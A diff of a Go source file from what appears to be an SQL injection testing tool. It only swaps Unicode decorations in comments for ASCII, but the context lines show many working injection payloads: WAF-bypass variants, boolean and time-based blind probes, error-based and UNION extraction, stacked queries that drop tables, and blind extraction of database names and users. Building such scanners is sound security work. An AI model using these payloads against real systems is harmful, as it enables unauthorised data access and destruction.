@@ -3,9 +3,9 @@ package payloads
 var Mega = PayloadGroup{
 	DBMS: "Mega",
 	Payloads: []Payload{
-		// ═════════════════════════════════════════════════════
-		// WAF BYPASS — COMMENT/SPACE OBFUSCATION (100+)
-		// ═════════════════════════════════════════════════════
+		// =====================================================
+		// WAF BYPASS - COMMENT/SPACE OBFUSCATION (100+)
+		// =====================================================
 		{Type: "bypass", Content: "'/**/OR/**/1=1--"},
 		{Type: "bypass", Content: "'/**/AND/**/1=1--"},
 		{Type: "bypass", Content: "'/**/UNION/**/SELECT/**/1,2--"},
@@ -146,9 +146,9 @@ var Mega = PayloadGroup{
 		{Type: "bypass", Content: "1' OR 1=1 SELECT * FROM users--"},
 		{Type: "bypass", Content: "1' AND 1=1 SELECT * FROM users--"},
 
-		// ═════════════════════════════════════════════════════
-		// BOOLEAN BLIND — ADVANCED VARIATIONS (100+)
-		// ═════════════════════════════════════════════════════
+		// =====================================================
+		// BOOLEAN BLIND - ADVANCED VARIATIONS (100+)
+		// =====================================================
 		{Type: "boolean", Content: "' AND 'a'='a", Expected: "true"},
 		{Type: "boolean", Content: "' AND 'a'='b", Expected: "false"},
 		{Type: "boolean", Content: "' AND 'abc'='abc", Expected: "true"},
@@ -237,9 +237,9 @@ var Mega = PayloadGroup{
 		{Type: "boolean", Content: "' AND ORD('a')=97", Expected: "true"},
 		{Type: "boolean", Content: "' AND ORD('a')=65", Expected: "false"},
 
-		// ═════════════════════════════════════════════════════
-		// TIME-BASED BLIND — HEAVY / CARTESIAN (150+)
-		// ═════════════════════════════════════════════════════
+		// =====================================================
+		// TIME-BASED BLIND - HEAVY / CARTESIAN (150+)
+		// =====================================================
 		{Type: "time", Content: "' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)--"},
 		{Type: "time", Content: "\" AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)--"},
 		{Type: "time", Content: "') AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)--"},
@@ -361,9 +361,9 @@ var Mega = PayloadGroup{
 		{Type: "time", Content: "' AND CASE WHEN 1=1 THEN pg_sleep(5) ELSE 0 END--"},
 		{Type: "time", Content: "' AND CASE WHEN 1=1 THEN pg_sleep(10) ELSE 0 END--"},
 
-		// ═════════════════════════════════════════════════════
-		// ERROR-BASED — CROSS-DBMS (70+)
-		// ═════════════════════════════════════════════════════
+		// =====================================================
+		// ERROR-BASED - CROSS-DBMS (70+)
+		// =====================================================
 		{Type: "error", Content: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND()*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--"},
 		{Type: "error", Content: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND()*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--"},
 		{Type: "error", Content: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND()*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--"},
@@ -421,9 +421,9 @@ var Mega = PayloadGroup{
 		{Type: "error", Content: "' AND (SELECT 1 FROM (SELECT 1 WHERE 1/0) a)--"},
 		{Type: "error", Content: "' AND (SELECT 1 FROM (SELECT 1 FROM (SELECT 1 WHERE 1/0) a) b)--"},
 
-		// ═════════════════════════════════════════════════════
-		// UNION-BASED — ADVANCED VARIATIONS (60+)
-		// ═════════════════════════════════════════════════════
+		// =====================================================
+		// UNION-BASED - ADVANCED VARIATIONS (60+)
+		// =====================================================
 		{Type: "union", Content: "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--"},
 		{Type: "union", Content: "' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--"},
 		{Type: "union", Content: "' UNION SELECT NULL--"},
@@ -484,9 +484,9 @@ var Mega = PayloadGroup{
 		{Type: "union", Content: "' UNION SELECT 1,database(),user()--"},
 		{Type: "union", Content: "' UNION SELECT 1,current_user,current_database--"},
 
-		// ═════════════════════════════════════════════════════
-		// STACKED QUERIES — ADVANCED (50+)
-		// ═════════════════════════════════════════════════════
+		// =====================================================
+		// STACKED QUERIES - ADVANCED (50+)
+		// =====================================================
 		{Type: "stacked", Content: "'; DROP TABLE IF EXISTS _tmp; CREATE TABLE _tmp (id INT); INSERT INTO _tmp VALUES (1); SELECT * FROM _tmp;--"},
 		{Type: "stacked", Content: "'; SELECT * FROM (SELECT 1) a;--"},
 		{Type: "stacked", Content: "'; BEGIN TRANSACTION; SELECT 1; COMMIT;--"},
@@ -538,9 +538,9 @@ var Mega = PayloadGroup{
 		{Type: "stacked", Content: "'; SELECT * FROM all_tables;--"},
 		{Type: "stacked", Content: "'; SELECT * FROM all_objects WHERE owner='PUBLIC';--"},
 
-		// ═════════════════════════════════════════════════════
-		// ORDER BY / GROUP BY — PROBE VARIATIONS (40+)
-		// ═════════════════════════════════════════════════════
+		// =====================================================
+		// ORDER BY / GROUP BY - PROBE VARIATIONS (40+)
+		// =====================================================
 		{Type: "orderBy", Content: "' ORDER BY 1-- "},
 		{Type: "orderBy", Content: "' ORDER BY 2-- "},
 		{Type: "orderBy", Content: "' ORDER BY 3-- "},
@@ -586,9 +586,9 @@ var Mega = PayloadGroup{
 		{Type: "orderBy", Content: "' GROUP BY 1,2,3--"},
 		{Type: "orderBy", Content: "' GROUP BY 1,2,3,4,5--"},
 
-		// ═════════════════════════════════════════════════════
-		// DATA EXFILTRATION — BLIND EXTRACTION (50+)
-		// ═════════════════════════════════════════════════════
+		// =====================================================
+		// DATA EXFILTRATION - BLIND EXTRACTION (50+)
+		// =====================================================
 		{Type: "blind-extract", Content: "' AND ASCII(SUBSTR((SELECT database()),%d,1))>%d--"},
 		{Type: "blind-extract", Content: "' AND ASCII(SUBSTR((SELECT user()),%d,1))>%d--"},
 		{Type: "blind-extract", Content: "' AND ASCII(SUBSTR((SELECT version()),%d,1))>%d--"},
@@ -640,9 +640,9 @@ var Mega = PayloadGroup{
 		{Type: "blind-extract", Content: "' AND ASCII(SUBSTR((SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1 OFFSET 1),%d,1))>%d--"},
 		{Type: "blind-extract", Content: "' AND ASCII(SUBSTR((SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1 OFFSET 2),%d,1))>%d--"},
 
-		// ═════════════════════════════════════════════════════
-		// ENCODING / ESCAPING — SPECIAL CHARACTER VARIATIONS (50+)
-		// ═════════════════════════════════════════════════════
+		// =====================================================
+		// ENCODING / ESCAPING - SPECIAL CHARACTER VARIATIONS (50+)
+		// =====================================================
 		{Type: "encoding", Content: "'%20OR%201=1--"},
 		{Type: "encoding", Content: "'%20AND%201=1--"},
 		{Type: "encoding", Content: "'%20UNION%20SELECT%201,2--"},
@@ -693,9 +693,9 @@ var Mega = PayloadGroup{
 		{Type: "encoding", Content: "'UNION%00SELECT 1,2--"},
 		{Type: "encoding", Content: "'UNION%20SELECT%201,2%00--"},
 
-		// ═════════════════════════════════════════════════════
-		// MULTI-PAYLOAD — COMBINATION INJECTIONS (70+)
-		// ═════════════════════════════════════════════════════
+		// =====================================================
+		// MULTI-PAYLOAD - COMBINATION INJECTIONS (70+)
+		// =====================================================
 		{Type: "multi", Content: "' OR 1=1 UNION SELECT 1,2,3--"},
 		{Type: "multi", Content: "' OR 1=1 UNION ALL SELECT 1,2,3--"},
 		{Type: "multi", Content: "' OR 1=1 UNION SELECT NULL,NULL,NULL--"},
